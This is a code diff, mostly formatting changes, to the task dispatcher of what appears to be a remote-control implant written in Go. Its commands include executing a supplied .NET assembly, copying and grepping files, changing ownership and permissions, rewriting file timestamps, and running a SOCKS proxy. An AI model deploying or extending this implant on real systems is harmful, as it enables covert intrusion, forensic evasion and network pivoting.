@@ -54,26 +54,44 @@ func parseFSTaskArgs(raw string) (fsTaskArgs, error) {
 
 func copyPath(src, dst string) error {
 	info, err := os.Stat(src)
-	if err != nil { return err }
+	if err != nil {
+		return err
+	}
 	if d, err := os.Stat(dst); err == nil && d.IsDir() {
 		dst = filepath.Join(dst, filepath.Base(filepath.Clean(src)))
 	}
 	if !info.IsDir() {
-		if err := os.MkdirAll(filepath.Dir(dst), 0755); err != nil { return err }
-		in, err := os.Open(src); if err != nil { return err }
+		if err := os.MkdirAll(filepath.Dir(dst), 0755); err != nil {
+			return err
+		}
+		in, err := os.Open(src)
+		if err != nil {
+			return err
+		}
 		defer in.Close()
 		out, err := os.OpenFile(dst, os.O_CREATE|os.O_TRUNC|os.O_WRONLY, info.Mode().Perm())
-		if err != nil { return err }
+		if err != nil {
+			return err
+		}
 		_, cpErr := io.Copy(out, in)
 		closeErr := out.Close()
-		if cpErr != nil { return cpErr }
+		if cpErr != nil {
+			return cpErr
+		}
 		return closeErr
 	}
 	return filepath.Walk(src, func(path string, fi os.FileInfo, walkErr error) error {
-		if walkErr != nil { return walkErr }
-		rel, err := filepath.Rel(src, path); if err != nil { return err }
+		if walkErr != nil {
+			return walkErr
+		}
+		rel, err := filepath.Rel(src, path)
+		if err != nil {
+			return err
+		}
 		target := filepath.Join(dst, rel)
-		if fi.IsDir() { return os.MkdirAll(target, fi.Mode().Perm()) }
+		if fi.IsDir() {
+			return os.MkdirAll(target, fi.Mode().Perm())
+		}
 		return copyPath(path, target)
 	})
 }
@@ -82,21 +100,56 @@ func shellQuoteUnix(s string) string { return "'" + strings.ReplaceAll(s, "'", "
 
 func grepPath(pattern, root string, recursive bool) (string, error) {
 	rx, err := regexp.Compile(pattern)
-	if err != nil { return "", err }
-	if root == "" { root = "." }
+	if err != nil {
+		return "", err
+	}
+	if root == "" {
+		root = "."
+	}
 	var out strings.Builder
 	matchFile := func(path string) error {
-		data, err := os.ReadFile(path); if err != nil { return nil }
+		data, err := os.ReadFile(path)
+		if err != nil {
+			return nil
+		}
 		for n, line := range strings.Split(string(data), "\n") {
-			if rx.MatchString(line) { fmt.Fprintf(&out, "%s:%d:%s\n", path, n+1, line) }
-			if out.Len() > 1024*1024 { return filepath.SkipAll }
+			if rx.MatchString(line) {
+				fmt.Fprintf(&out, "%s:%d:%s\n", path, n+1, line)
+			}
+			if out.Len() > 1024*1024 {
+				return filepath.SkipAll
+			}
 		}
 		return nil
 	}
-	info, err := os.Stat(root); if err != nil { return "", err }
-	if !info.IsDir() { return out.String(), matchFile(root) }
-	if !recursive { entries, e := os.ReadDir(root); if e != nil { return "", e }; for _, ent := range entries { if !ent.IsDir() { _ = matchFile(filepath.Join(root, ent.Name())) } }; return out.String(), nil }
-	err = filepath.Walk(root, func(path string, fi os.FileInfo, walkErr error) error { if walkErr != nil { return nil }; if !fi.IsDir() { return matchFile(path) }; return nil })
+	info, err := os.Stat(root)
+	if err != nil {
+		return "", err
+	}
+	if !info.IsDir() {
+		return out.String(), matchFile(root)
+	}
+	if !recursive {
+		entries, e := os.ReadDir(root)
+		if e != nil {
+			return "", e
+		}
+		for _, ent := range entries {
+			if !ent.IsDir() {
+				_ = matchFile(filepath.Join(root, ent.Name()))
+			}
+		}
+		return out.String(), nil
+	}
+	err = filepath.Walk(root, func(path string, fi os.FileInfo, walkErr error) error {
+		if walkErr != nil {
+			return nil
+		}
+		if !fi.IsDir() {
+			return matchFile(path)
+		}
+		return nil
+	})
 	return out.String(), err
 }
 
@@ -299,11 +352,11 @@ func dispatchTask(t transport, task taskWire) {
 	case "DOTNET_EXEC":
 		// Args JSON: {"asm":"<base64>","args":"<string>","type":"<opt>","method":"<opt>"}
 		var da struct {
-			Asm    string `json:"asm"`
-			Args   string `json:"args"`
-			Type   string `json:"type"`
-			Method string `json:"method"`
-			TimeoutSec int `json:"timeout_sec"`
+			Asm        string `json:"asm"`
+			Args       string `json:"args"`
+			Type       string `json:"type"`
+			Method     string `json:"method"`
+			TimeoutSec int    `json:"timeout_sec"`
 		}
 		if err := json.Unmarshal([]byte(task.Args), &da); err != nil {
 			t.sendResult(task.ID, "", "bad DOTNET_EXEC args: "+err.Error())
@@ -522,54 +575,119 @@ func dispatchTask(t transport, task taskWire) {
 
 	case "CP", "MV":
 		a, _ := parseFSTaskArgs(task.Args)
-		if a.Src == "" || a.Dst == "" { t.sendResult(task.ID, "", "usage: {src,dst}"); return }
+		if a.Src == "" || a.Dst == "" {
+			t.sendResult(task.ID, "", "usage: {src,dst}")
+			return
+		}
 		var err error
 		if task.Type == "CP" {
 			err = copyPath(a.Src, a.Dst)
 		} else {
 			dst := a.Dst
-			if info, e := os.Stat(dst); e == nil && info.IsDir() { dst = filepath.Join(dst, filepath.Base(filepath.Clean(a.Src))) }
+			if info, e := os.Stat(dst); e == nil && info.IsDir() {
+				dst = filepath.Join(dst, filepath.Base(filepath.Clean(a.Src)))
+			}
 			err = os.Rename(a.Src, dst)
 			if err != nil {
-				if cpErr := copyPath(a.Src, dst); cpErr == nil { err = os.RemoveAll(a.Src) }
+				if cpErr := copyPath(a.Src, dst); cpErr == nil {
+					err = os.RemoveAll(a.Src)
+				}
 			}
 		}
-		if err != nil { t.sendResult(task.ID, "", task.Type+": "+err.Error()); return }
+		if err != nil {
+			t.sendResult(task.ID, "", task.Type+": "+err.Error())
+			return
+		}
 		t.sendResult(task.ID, fmt.Sprintf("[+] %s %s → %s", strings.ToLower(task.Type), a.Src, a.Dst), "")
 
 	case "GREP":
 		a, _ := parseFSTaskArgs(task.Args)
-		if a.Pattern == "" || a.Path == "" { t.sendResult(task.ID, "", "usage: {pattern,path}"); return }
+		if a.Pattern == "" || a.Path == "" {
+			t.sendResult(task.ID, "", "usage: {pattern,path}")
+			return
+		}
 		out, err := grepPath(a.Pattern, a.Path, a.Recursive)
-		if err != nil { t.sendResult(task.ID, "", "grep: "+err.Error()); return }
+		if err != nil {
+			t.sendResult(task.ID, "", "grep: "+err.Error())
+			return
+		}
 		t.sendResult(task.ID, out, "")
 
 	case "MOUNT":
 		arg := strings.TrimSpace(task.Args)
-		if strings.HasPrefix(arg, "{") { var a fsTaskArgs; _ = json.Unmarshal([]byte(arg), &a); arg = a.Path }
-		cmd := "mount"; if arg != "" { cmd += " " + shellQuoteUnix(arg) }
-		t.sendResult(task.ID, runShell(cmd), "")
+		if strings.HasPrefix(arg, "{") {
+			var a fsTaskArgs
+			_ = json.Unmarshal([]byte(arg), &a)
+			arg = a.Path
+		}
+		cmd := "mount"
+		if arg != "" {
+			cmd += " " + shellQuoteUnix(arg)
+		}
+		out, err := runShell(cmd)
+		errStr := ""
+		if err != nil {
+			errStr = err.Error()
+		}
+		t.sendResult(task.ID, out, errStr)
 
 	case "CHMOD":
 		a, _ := parseFSTaskArgs(task.Args)
 		mode, err := strconv.ParseUint(strings.TrimPrefix(strings.TrimSpace(a.Mode), "0o"), 8, 32)
-		if err != nil || a.Path == "" { t.sendResult(task.ID, "", "usage: {mode,path}"); return }
-		if err := os.Chmod(a.Path, os.FileMode(mode)); err != nil { t.sendResult(task.ID, "", "chmod: "+err.Error()); return }
+		if err != nil || a.Path == "" {
+			t.sendResult(task.ID, "", "usage: {mode,path}")
+			return
+		}
+		if err := os.Chmod(a.Path, os.FileMode(mode)); err != nil {
+			t.sendResult(task.ID, "", "chmod: "+err.Error())
+			return
+		}
 		t.sendResult(task.ID, fmt.Sprintf("[+] chmod %s %s", a.Mode, a.Path), "")
 
 	case "CHOWN":
 		a, _ := parseFSTaskArgs(task.Args)
-		if runtime.GOOS == "windows" { t.sendResult(task.ID, "", "chown: not supported on Windows"); return }
-		if a.Owner == "" || a.Path == "" { t.sendResult(task.ID, "", "usage: {owner,group,path}"); return }
-		owner := a.Owner; if a.Group != "" { owner += ":" + a.Group }
-		t.sendResult(task.ID, runShell("chown " + shellQuoteUnix(owner) + " " + shellQuoteUnix(a.Path)), "")
+		if runtime.GOOS == "windows" {
+			t.sendResult(task.ID, "", "chown: not supported on Windows")
+			return
+		}
+		if a.Owner == "" || a.Path == "" {
+			t.sendResult(task.ID, "", "usage: {owner,group,path}")
+			return
+		}
+		owner := a.Owner
+		if a.Group != "" {
+			owner += ":" + a.Group
+		}
+		out, err := runShell("chown " + shellQuoteUnix(owner) + " " + shellQuoteUnix(a.Path))
+		errStr := ""
+		if err != nil {
+			errStr = err.Error()
+		}
+		t.sendResult(task.ID, out, errStr)
 
 	case "CHTIMES":
 		a, _ := parseFSTaskArgs(task.Args)
-		if a.Path == "" || a.MTime == "" { t.sendResult(task.ID, "", "usage: {mtime,path}"); return }
-		mt, err := time.Parse(time.RFC3339, a.MTime); if err != nil { t.sendResult(task.ID, "", "chtimes: "+err.Error()); return }
-		at := mt; if a.ATime != "" { at, err = time.Parse(time.RFC3339, a.ATime); if err != nil { t.sendResult(task.ID, "", "chtimes: "+err.Error()); return } }
-		if err := os.Chtimes(a.Path, at, mt); err != nil { t.sendResult(task.ID, "", "chtimes: "+err.Error()); return }
+		if a.Path == "" || a.MTime == "" {
+			t.sendResult(task.ID, "", "usage: {mtime,path}")
+			return
+		}
+		mt, err := time.Parse(time.RFC3339, a.MTime)
+		if err != nil {
+			t.sendResult(task.ID, "", "chtimes: "+err.Error())
+			return
+		}
+		at := mt
+		if a.ATime != "" {
+			at, err = time.Parse(time.RFC3339, a.ATime)
+			if err != nil {
+				t.sendResult(task.ID, "", "chtimes: "+err.Error())
+				return
+			}
+		}
+		if err := os.Chtimes(a.Path, at, mt); err != nil {
+			t.sendResult(task.ID, "", "chtimes: "+err.Error())
+			return
+		}
 		t.sendResult(task.ID, "[+] timestamps updated", "")
 
 	// ── Process ───────────────────────────────────────────────────────────────
@@ -620,7 +738,7 @@ func dispatchTask(t transport, task taskWire) {
 		port := 1080
 		var socksU, socksP string
 		var sa struct {
-			Port int `json:"port"`
+			Port int    `json:"port"`
 			User string `json:"user"`
 			Pass string `json:"pass"`
 		}
@@ -1162,7 +1280,9 @@ func dispatchTask(t transport, task taskWire) {
 			if p, err := strconv.Atoi(strings.TrimSpace(task.Args)); err == nil {
 				port = p
 			} else {
-				var pa struct{ Port int `json:"port"` }
+				var pa struct {
+					Port int `json:"port"`
+				}
 				if json.Unmarshal([]byte(task.Args), &pa) == nil && pa.Port > 0 {
 					port = pa.Port
 				}
@@ -1183,7 +1303,9 @@ func dispatchTask(t transport, task taskWire) {
 			if p, err := strconv.Atoi(strings.TrimSpace(task.Args)); err == nil {
 				port = p
 			} else {
-				var pa struct{ Port int `json:"port"` }
+				var pa struct {
+					Port int `json:"port"`
+				}
 				if json.Unmarshal([]byte(task.Args), &pa) == nil && pa.Port > 0 {
 					port = pa.Port
 				}
